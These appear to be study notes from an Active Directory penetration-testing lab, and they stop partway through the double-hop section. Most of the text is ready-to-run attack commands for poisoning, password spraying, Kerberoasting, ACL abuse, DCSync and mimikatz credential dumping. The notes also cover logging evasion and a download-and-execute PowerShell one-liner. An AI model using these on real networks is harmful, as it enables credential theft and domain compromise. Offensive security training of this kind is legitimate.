# Active Directory Enumeration and Attacks

1. [Initial enumeration](#initial-enumeration)
1. [Foothold](#foothold)
1. [Password spraying](#password-spraying)
1. [Credentialed enumeration](#credentialed-enumeration)
1. [Kerberoasting](#kerberoasting)
1. [ACL abuse](#acl-abuse)
1. [Privileged access](#privileged-access)
1. [Attacking domain trusts](#attacking-domain-trusts)
1. [Skills assessment](#skills-assessment)

## Initial enumeration

* External recon:

    * IP space - [BGP toolkit](http://he.net/)
    * domain info - [view DNS](https://viewdns.info/)
    * public data
    * Google dorks, OSINT - [linkedin2username](https://github.com/initstring/linkedin2username)
    * breach data - [dehashed](http://dehashed.com/)

* Enumeration:

    * identifying hosts:

        ```sh
        sudo -E wireshark
        # to capture network traffic

        sudo tcpdump -i ens224
        # CLI alternative

        sudo responder -I ens224 -A
        # -A to listen and analyze traffic

        fping -asgq 172.16.5.0/23
        # ICMP sweep of subnet
        # -a to show alive targets
        # -s to print stats
        # -g to generate target list
        # -q to not show per-target results
        ```

        ```sh
        # for list of active hosts, we can do nmap scan
        sudo nmap -v -A -iL hosts.txt -oN Documents/host-enum
        ```
    
    * identifying users:

        ```sh
        # we can use kerbrute for domain account enum
        # use a wordlist from - https://github.com/insidetrust/statistically-likely-usernames - like jsmith.txt or jsmith2.txt

        ./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
        ```

## Foothold

* LLMNR/NBT-NS poisoning:

    * LLMNR (Link-Local Multicast Name Resolution) & NBT-NS (NetBIOS Name Service) - Windows components that serve as alternative methods of host identification that can be used when DNS fails

    * LLMNR is based on DNS format and allows hosts on same local link to perform name resolution for other hosts; uses UDP/5355

    * NBT-NS (used when LLMNR fails) identifies systems on local network using their NetBIOS name; uses UDP/137

    * when LLMNR/NBT-NS is used, any host on the network can reply, so we can use ```responder``` to poison these requests & capture hashes and/or authentication requests (which can be relayed if SMB signing is disabled)

    * from Linux:

        ```sh
        sudo responder -I ens224
        # keep it running to increase chances of capturing hashes
        ```

        ```sh
        # crack captured hashes
        hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
        # NTLMv2 hash cracking
        ```

    * from Windows:

        ```ps
        # powershell version of Inveigh
        Import-Module .\Inveigh.ps1

        (Get-Command Invoke-Inveigh).Parameters
        # view all params

        # config LLMNR and NBNS spoofing
        Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
        ```

        ```ps
        # C# version of Inveigh
        .\Inveigh.exe
        # runs with default options enabled

        # press 'Esc' while the tool is running to enter/exit menu

        GET NTLMV2UNIQUE
        # view captured hashes

        get NTLMV2USERNAMES
        # view collected usernames

        STOP
        # stop tool
        ```

## Password spraying

* Enumerating password policy:

    * with valid creds:

        ```sh
        # if we have valid domain creds, we can get password policy
        crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
        ```
    
    * without creds - via SMB null session:

        ```sh
        rpcclient -U "" -N 172.16.5.5

        querydominfo
        # get domain info

        getdompwinfo
        # password policy
        ```

        ```sh
        # using other tools
        enum4linux -P 172.16.5.5

        enum4linux-ng -P 172.16.5.5 -oA ilfreight
        # newer version, offers more features like exporting data
        ```

        ```cmd
        # enumerating null sessions from Windows
        net use \\DC01\ipc$ "" /u:""

        # if we have creds
        net use \\DC01\ipc$ "password" /u:guest
        ```
    
    * without creds - via LDAP anonymous bind:

        ```sh
        ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
        # alt tools include windapsearch.py, ad-ldapdomaindump.py
        ```
    
    * with valid creds - from Windows:

        ```cmd
        net accounts
        ```

        ```ps
        # using PowerView
        Import-Module .\PowerView.ps1

        Get-DomainPolicy
        ```

* Analyzing password policy:

    * minimum password length
    * account lockout threshold
    * lockout duration
    * password complexity enabled/disabled

* Detailed user enumeration:

    * SMB NULL sessions:

        ```sh
        enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
        ```

        ```sh
        rpcclient -U "" -N 172.16.5.5

        enumdomusers
        ```

        ```sh
        crackmapexec smb 172.16.5.5 --users
        # this also shows 'badpwcount' and 'baddpwdtime'
        # so we can avoid password spraying users who are close to lockout threshold
        ```
    
    * LDAP anonymous:

        ```sh
        ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
        # need to specify valid LDAP search filter
        ```

        ```sh
        ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
        ```
    
    * kerbrute:

        ```sh
        kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
        # test with different wordlists from 'statistically-likely-usernames' repo
        # or use tools like 'linkedin2username' to create possible usernames from company social media pages
        ```
    
    * credentialed enumeration:

        ```sh
        sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
        ```

* Internal password spraying from Linux:

    * password spray methods:

        ```sh
        for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
        # password spray using rpcclient
        ```

        ```sh
        kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
        ```

        ```sh
        sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

        sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
        # to validate creds
        ```
    
    * local admin password reuse:

        * for local administrator accounts, password re-use or similar formats is common; for example, if a workstation has the local admin account password as '$desktop%@admin123', then we can attempt the password '$server%@admin123' against local admin accounts on servers - and we can attempt this similarly for non-standard local admin accounts

        * if we get the NTLM hash for the local admin account from the local SAM database, we can spray this hash across the network to find local admin accounts with same password:

            ```sh
            sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
            # --local-auth to attempt log in once on each machine
            # if this is removed, it attempts to authenticate using current domain - this can cause lockouts
            ```

* Internal password spraying from Windows:

    ```ps
    Import-Module .\DomainPasswordSpray.ps1

    # if we are on a domain-joined host, this tool automatically generates a user list from AD
    # if we are on a non-domain host, we need to use our own user list

    Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
    ```

## Credentialed enumeration

* Enumerating security controls:

    ```ps
    # after gaining a foothold

    Get-MpComputerStatus
    # 'RealTimeProtectionEnabled' is set to 'True'
    # this means Windows Defender is enabled on system

    # view AppLocker rules
    Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
    # for example - it blocks launching 'PowerShell.exe', but we can bypass this
    # by running PowerShell executable from other locations, or alternatives like 'PowerShell_ISE.exe'

    $ExecutionContext.SessionState.LanguageMode
    # check if PS is in Constrained Language mode or Full Language mode
    # the former blocks several PS features

    # LAPS - Local Administrator Password Solution - to randomize & rotate local admin passwords
    # check if this is enabled using LAPSToolkit - https://github.com/leoloobeek/LAPSToolkit
    Import-Module .\LAPSToolkit.ps1

    Find-LAPSDelegatedGroups
    # this parses 'ExtendedRights' for all hosts with LAPS enabled
    # this shows groups of users who can read LAPS passwords - use this to target specific AD users

    Find-AdmPwdExtendedRights
    # checks rights on hosts with LAPS enabled, for any groups with read access and users with 'All Extended Rights'

    Get-LAPSComputers
    # search for hosts with LAPS enabled when passwords expire
    ```

* Credentialed enumeration from Linux:

    ```sh
    crackmapexec smb -h
    # cme has help options for each protocol

    sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
    # domain user enumeration
    # here, 172.16.5.5 is the DC

    sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
    # domain group enumeration

    sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
    # target a particular host and check currently logged in users

    sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
    # enumerate available shares on any host, and check read/write access

    sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
    # using the 'spider_plus' module, we can spider each readable directory to check for files
    # this writes the output to a JSON file that we can read later
    ```

    ```sh
    smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
    # list shares, check access

    smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
    # recursively list a share
    # --dir-only to show output of directories only and not files
    ```

    ```sh
    # if SMB NULL sessions are allowed, connect to host
    rpcclient -U "" -N 172.16.5.5

    queryuser 0x457
    # user enumeration using RID
    # RID value is in hex here, 0x457 is 1111 in decimal

    enumdomusers
    # gather RID and username for all users
    ```

    ```sh
    # from impacket toolkit
    # psexec.py can be used for RCE

    impacket-psexec inlanefreight.local/wley:'transporter@4'@172.16.5.125
    # creds for user with local admin privilege required
    # to get shell as SYSTEM

    # wmiexec.py is similar but gives RCE as local admin instead of SYSTEM
    impacket-wmiexec inlanefreight.local/wley:'transporter@4'@172.16.5.5
    ```

    ```sh
    # windapsearch can be used for enum using LDAP queries

    python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
    # --da to enumerate domain admins group members

    python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
    # -PU to find privileged users
    ```

    ```sh
    # for bloodhound, we can use the SharpHound.ps1 collector or the BloodHound.py ingestor to collect data
    # SharpHound.ps1 is run from Windows, while BloodHound.py can be run on attacker

    sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
    # collect all data

    ls
    # JSON output files

    zip -r ilfreight_bh.zip *.json
    # zip all JSON files

    sudo neo4j start
    # start neo4j service

    bloodhound
    # start bloodhound GUI
    # we can upload the ZIP file in bloodhound now

    # bloodhound cypher query cheatsheet - https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/
    ```

* Credentialed enumeration from Windows:

    ```ps
    # ActiveDirectory PS module

    Get-Module
    # check if it is imported already

    # if not, import it
    Import-Module ActiveDirectory

    Get-ADDomain
    # domain info

    Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
    # get AD users with SPNs - possible targets for kerberoasting

    Get-ADTrust -Filter *
    # check domain trust relationships

    Get-ADGroup -Filter * | select name
    # AD group info

    Get-ADGroup -Identity "Backup Operators"
    # specific group info

    Get-ADGroupMember -Identity "Backup Operators"
    # check group members
    ```

    ```ps
    # using PowerView

    Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
    # get specific user info

    Get-DomainGroupMember -Identity "Domain Admins" -Recurse
    # get specific group info
    # -Recurse lists out members of child groups as well

    Get-DomainTrustMapping
    # trust enumeration

    Test-AdminAccess -ComputerName ACADEMY-EA-MS01
    # test for local admin access on any machine

    Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
    # find users with SPNs
    ```

    ```ps
    # using SharpView, a .NET port of PowerView

    .\SharpView.exe Get-DomainUser -Help
    # get argument list for a method

    .\SharpView.exe Get-DomainUser -Identity forend
    # get specific user info

    # this tool can be used as an alternative when we cannot use PowerShell
    ```

    ```ps
    # using Snaffler, we can get sensitive data from shares
    # it must be run from a domain-joined host or as a domain user

    .\Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
    # -s to print logs to console
    ```

    ```ps
    # for bloodhound
    # collect the data using SharpHound
    .\SharpHound.exe -c All --zipfilename ILFREIGHT
    # once the zip file is generated, upload to bloodhound GUI on attacker

    # in bloodhound, we can use prebuilt queries for analysis
    # like 'Find Computers with Unsupported Operating Systems' or 'Find Computers where Domain Users are Local Admin'
    ```

* Living off the land:

    ```ps
    # basic enum

    hostname
    # PC name

    [System.Environment]::OSVersion.Version
    # OS version, revision level

    wmic qfe get Caption,Description,HotFixID,InstalledOn
    # patches and hotfixes applied

    ipconfig /all
    # network info
    ```

    ```cmd
    # basic enum in cmd

    set
    # list env variables

    echo %USERDOMAIN%
    # domain name to which the host belongs

    echo %logonserver%
    # DC name

    systeminfo
    # host info summary
    ```

    ```ps
    # built-in cmdlets

    Get-Module
    # lists available modules

    Get-ExecutionPolicy -List
    # shows execution policy settings for each scope

    Set-ExecutionPolicy Bypass -Scope process
    # changes policy for current process only

    Get-ChildItem Env: | ft key,Value
    # print env values

    Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
    # get PS history for current user

    powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"
    # download a file and call it from memory
    ```

    ```ps
    # PS event logging was introduced with version 3.0
    # so we can attempt to downgrade PS to evade logging

    Get-Host
    # current version

    powershell.exe -version 2
    # downgrade powershell

    Get-Host

    Get-Module
    ```

    ```ps
    # firewall checks

    netsh advfirewall show allprofiles

    Get-MpComputerStatus
    # windows defender status, config
    ```

    ```cmd
    sc query windefend
    # windows defender running
    ```

    ```ps
    # network checks

    qwinsta
    # check currently logged-in users

    arp -a
    # ARP table, check for other hosts

    ipconfig /all
    # network adapter settings

    route print
    # routing table
    ```

    ```ps
    # WMI checks
    # WMI cheatsheet for ref - https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4

    wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
    # basic host info

    wmic process list /format:list
    # list all processes

    wmic ntdomain list /format:list
    # info about domain, DC

    wmic useraccount list /format:list
    # info on all local accounts, and domain accounts logged in previously

    wmic group list /format:list
    # info on local groups

    wmic sysaccount list /format:list
    # info on system accounts used as service accounts

    wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
    # domain and forest info
    ```

    ```ps
    # net commands

    net group /domain
    # list domain groups

    # without the /domain flag, the commands will only run on local machine instead of DC

    net localgroup
    # all available groups

    net localgroup administrators /domain
    # list users that belong to this group, inside the domain

    net user wrouse /domain
    # info about domain user

    net accounts /domain
    # password and lockout policy

    net share
    # check current shares

    net view
    # list computers

    # if any logging is preventing from running 'net' commands, we can use 'net1' keyword instead
    ```

    ```ps
    # dsquery can be used to find AD objects
    # to use the dsquery DLL, we need elevated privileges

    dsquery user
    # domain users

    dsquery computer
    # domain computers

    dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
    # wildcard searches

    # we can use this with LDAP search filters

    dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
    # check for users with specific attribute 'PASSWD_NOTREQD' set
    # the queries check for UAC attributes and values, using OIDs

    dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
    # search for DCs
    ```

## Kerberoasting

* To perform a kerberoasting attack, we need an account's cleartext password or NTLM hash, a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host

* Kerberoasting from Linux:

    ```sh
    impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
    # list SPN accounts

    impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
    # request all TGS tickets

    impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
    # request a single TGS ticket

    impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
    # save the TGS ticket hashes to a file

    hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
    # TGS ticket hash cracking

    # verify the cracked password
    sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
    ```

* Kerberoasting from Windows:

    * manual approach:

        ```cmd
        setspn.exe -Q */*
        # enumerate SPNs
        # check the user account SPNs
        ```

        ```ps
        # we can request TGS tickets for one of the user accounts and load them in memory

        Add-Type -AssemblyName System.IdentityModel
        # adds a .NET framework class to current PS session
        # System.IdentityModel namespace contains classes for building security token services

        New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
        # creates an instance of an object, to create a security token and request TGS ticket for this account

        setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
        # we can also retrieve all tickets, but this includes all computer accounts so it is not optimal

        # now we can use mimikatz to extract tickets from memory
        # needs elevated session

        .\mimikatz.exe

        privilege::debug

        token::elevate

        base64 /out:true
        # if we do not specify this, mimikatz extracts the tickets in '.kirbi' files
        # we can skip this if we can transfer files easily

        kerberos::list /export
        # copy the base64 ticket output
        ```

        ```sh
        # in attacker machine
        
        # need to remove newlines and whitespaces as the output was column-wrapped
        echo "<base64-ticket>" | tr -d \\n
        # prepare the base64 output for cracking

        # paste the above single-line output
        vim encoded_file
        
        # decode it back into a '.kirbi' file
        cat encoded_file | base64 -d > sqldev.kirbi

        # we can use an older version of kirbi2john.py tool - https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py
        # to extract the kerberos ticket from the TGS file

        python2.7 kirbi2john.py sqldev.kirbi
        # this creates a 'crack_file' - we need to modify this before using with hashcat

        sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

        cat sqldev_tgs_hashcat
        # confirm the prepared hash is in the correct format

        hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
        # crack the hash
        ```

    * automated approach:

        ```ps
        Import-Module .\PowerView.ps1

        Get-DomainUser * -spn | select samaccountname
        # enumerate SPN accounts using PowerView

        Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
        # target specific user and get TGS ticket hash

        Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
        # export all tickets to CSV file

        cat .\ilfreight_tgs.csv
        # verify ticket hashes
        ```

        ```ps
        # we can also use rubeus for kerberoasting

        .\Rubeus.exe kerberoast /stats
        # check users, their supported encryption types, and password last set year
        # if the password was set a long time ago, it could be a weaker password

        .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
        # request tickets for high-value targets
        # /nowrap to prevent column-wrapping base64 text

        .\Rubeus.exe kerberoast /user:testspn /nowrap
        # kerberoast specific user

        .\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap
        # /tgtdeleg flag to opt for only RC4 encryption for the ticket request
        # this would not work on newer Windows versions and AES encryption would be supported
        ```

* Depending on supported encryption type, kerberoasting tools can request hashes in RC4 (type 23), AES-128 (type 17) or AES-256 (type 18) format - RC4 is the easiest to crack, and ```hashcat``` uses different modes for each of these hashes

## ACL abuse

* ACL overview:

    * ACLs (access control lists) define who has access to which resource and their level of access; the settings in ACLs are called ACEs (access control entries), and each ACE maps to a user/group/process (security principal)

    * types of ACLs:

        * DACL (discretionary ACL) - ACEs either allow or deny access; if a DACL does not exist for an object, all who attempt to access it are granted full rights, and if a DACL exists but has no ACE entries, implicit deny is followed
        * SACL (system ACL) - allow admins to log access attempts made to secured objects
    
    * types of ACEs:

        * access denied ACE (used in DACL)
        * access allowed ACE (used in DACL)
        * system audit ACE (used in SACL)
    
    * ACE components:

        * SID of the security principal
        * flag denoting type of ACE
        * set of flags that specify whether or not child objects can inherit the ACE entry from parent object
        * access mask (32-bit value) that defines rights granted to object
    
    * if ACEs are applied incorrectly or misconfigured, we can abuse it; examples of weak AD permissions include 'ForceChangePassword', 'GenericWrite', 'AddSelf', 'WriteOwner' and 'GenericAll'

* ACL enumeration:

    * using PowerView:

        ```ps
        Import-Module .\PowerView.ps1

        Find-InterestingDomainAcl
        # this gives a lot of ACLs

        # we can perform targeted enumeration to save time
        
        # suppose we have control over a certain user
        $sid = Convert-NameToSid wley
        # get SID of target user

        Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
        # targeted search, to find all domain objects that 'wley' has access rights over

        # if we run this without 'ResolveGUIDs' flag, we need to reverse search the 'ObjectAceType' property to get the AD right
        # we can search using Google or a PS cmdlet

        # in new PS session
        $guid= "00299570-246d-11d0-a768-00aa006e0529"
        # ObjectAceType value

        Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
        # this shows the GUID value is mapped to 'User-Force-Change-Password'
        ```

        ```ps
        # if we do not have PowerView, we need to enumerate ACLs manually
        # this will take a lot of time

        Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
        # create list of domain users

        foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
        # fetch ACL info for each domain user, select only the 'Access' property
        # and filter matches only for 'IdentityReference' set to target user 'wley'
        ```

        ```ps
        # suppose we have 'User-Force-Change-Password' extended right over user 'damundsen'
        # enumerate further using PowerView - this is a cyclic process

        $sid2 = Convert-NameToSid damundsen

        Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
        # this shows 'damundsen' has 'GenericWrite' over 'Help Desk Level 1' group
        # so we can add any user to this group, and inherit any rights for this group

        # check if this group has any interesting rights

        # check if this group is nested into any other groups - as it will inherit parent group rights
        Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
        # this group is nested into 'Information Technology' group

        # we can check further if members of this group have any interesting rights
        $itgroupsid = Convert-NameToSid "Information Technology"

        Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
        # this shows members of this group have 'GenericAll' rights over user 'adunn'
        # so we can modify group membership, force change password and perform targeted kerberoasting with this

        # check if 'adunn' has any interesting rights
        $adunnsid = Convert-NameToSid adunn

        Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose
        # this user has 'DS-Replication-Get-Changes' and 'DS-Replication-Get-Changes-In-Filtered-Set' over the domain object
        # this can be leveraged to perform a DCSync attack
        ```

    * using BloodHound:

        * fetch data using SharpHound ingestor and upload the ZIP file to ```bloodhound```

        * then, we can set target user 'wley' as starting node, and check for 'Outbound Control Rights' - if we check for the subcategory 'First Degree Object Control', we can see the user has 'ForceChangePassword' over 'damundsen'

        * if we click on the edge line, we get info on the ACE and how to abuse it

        * if we check the subcategory 'Transitive Object Control', we see complete paths from 'wley' to other objects - this can be used to form potential attack paths

        * we can also enumerate using prebuilt queries to find attack paths

* ACL abuse:

    * following the previous example, we have identified an attack chain:

        * use 'wley' to change password for 'damundsen'
        * use 'damundsen' to add user to 'Help Desk Level 1' group
        * use nested group membership in 'Information Technology' group and take control of 'adunn'
    
    * attack chain:

        ```ps
        # first, authenticate as 'wley' using PSCredential object

        $SecPassword = ConvertTo-SecureString 'Password123' -AsPlainText -Force
        $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

        # create a SecureString object for the new password for 'damundsen'
        $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

        # then, use Set-DomainUserPassword from PowerView to change the user password
        Import-Module .\PowerView.ps1

        Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

        # alternatively, this can be done from a Linux attack machine using a tool like 'pth-net' from 'pth-toolkit'
        ```

        ```ps
        # now we can use this new user to add ourselves to the enumerated group

        # authenticate as 'damundsen'
        $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
        $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)

        Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
        # currently we are not part of this group

        Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
        # add 'damundsen' to group using PowerView

        Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
        # verify
        ```

        ```ps
        # as we have 'GenericAll' over 'adunn' user using nested group membership
        # we can do attacks like changing password or targeted kerberoasting by creating a fake SPN

        Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
        # creates fake SPN

        .\Rubeus.exe kerberoast /user:adunn /nowrap
        # kerberoast 'adunn' user
        # then we can crack the hash offline

        # alternatively, this can be done from attacker host using 'targetedKerberoast' tool
        ```

* DCsync:

    ```ps
    # compromised user 'adunn' has replicating permissions

    Import-Module .\PowerView.ps1

    Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
    # get the user 'objectsid' value

    $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"

    Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
    # verify the user has the required replication rights
    # alternatively, if we have 'WriteDacl' right, we can add this privilege to a compromised user
    ```

    ```sh
    # dcsync attack from attacker host
    impacket-secretsdump -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
    # extracts all hashes
    # use '-just-dc-ntlm' to fetch only NTLM hashes, or '-just-dc-user' to target specific user
    # can also check '-pwd-last-set' or '-user-status' data, or '-history' for password history

    ls inlanefreight_hashes*
    # generates 3 files for - NTLM hashes, kerberos keys and cleartext passwords
    ```

    ```ps
    # check for users having reversible encryption configured
    # which can help in getting cleartext password

    Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
    
    Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
    ```

    ```ps
    # dcsync attack on Windows

    runas /netonly /user:INLANEFREIGHT\adunn powershell
    # use runas to spawn PS session in context of 'adunn', who has dcsync rights

    # in spawned PS session
    .\mimikatz.exe

    privilege::debug

    lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
    # in mimikatz, dcsync attack is done for specific user, so we can target built-in admin
    # this gives NTLM hash
    ```

## Privileged access

* Lateral movement:

    * RDP:

        ```ps
        # using powerview, check members of RDP group

        Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
        # for MS01, all domain users can RDP
        
        # can also check in bloodhound alternatively, under 'Execution Rights'
        ```

    * PS Remoting (WinRM):

        ```ps
        # check members of WinRM group
        Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

        # alternatively, check in bloodhound for 'CanPSRemote' rights
        ```

        ```ps
        # PS remoting in Windows

        $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
        $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)

        Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
        # spawns PS session as 'forend' user on MS01
        ```

        ```sh
        # PS remoting on attacker

        evil-winrm -i 10.129.201.234 -u forend -p 'Klmcargo2'
        ```

    * MSSQL server:

        ```ps
        # we can find accounts set with sysadmin privileges on a SQL server instance
        # or find SQL server creds using Snaffler, kerberoasting or password spraying

        # on bloodhound, we can check for 'SQLAdmin' rights

        # check using PowerUpSQL tool

        Import-Module .\PowerUpSQL.ps1

        Get-SQLInstanceDomain
        # SQL server info

        Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
        # authenticate to remote SQL server and run queries
        ```

        ```sh
        # on attacker, we can use mssqlclient
        impacket-mssqlclient INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth

        enable_xp_cmdshell
        # if allowed, we can use this to get RCE

        xp_cmdshell whoami /priv
        # run commands as the user on remote system for privesc
        ```

* Kerberos 'double hop' problem:

    * the 'double hop' problem occurs when using WinRM/PowerShell to authenticate across two or more connections/hops, as the default authentication mechanism only provides a ticket to access a specific resource, we face issues during lateral movement and the user is denied access

    * if password authentication is used, this issue does not occur as the password is cached in memory; when using Kerberos authentication, the user creds are not cached and tickets are used instead (this can be confirmed using ```mimikatz```)

    * when we use a tool like ```evil-winrm```, network authentication is used to connect so user creds are not stored in memory; when we try to use tools like ```PowerView``` and attempt to query AD, the 'double hop' issue occurs as the user's Kerberos ticket is not sent to the remote session (when authenticating, the TGS is sent but the TGT is not sent)

    * if unconstrained delegation is set, this issue won't occur

    * workarounds:

        1. we can connect to remote host via attacker and setup a PSCredential object to pass creds again:

            ```ps
            # in evil-winrm session
            # after connecting to a remote host with domain creds

            import-module .\PowerView.ps1

            get-domainuser -spn
            # this fails, as the authentication is not passed on to DC

            klist
            # shows a cached ticket for current server only

            # setup PSCredential object
            $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force

            $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)

            # now we can query by passing our creds
            get-domainuser -spn -credential $Cred | select samaccountname
            # this would not work without passing the creds
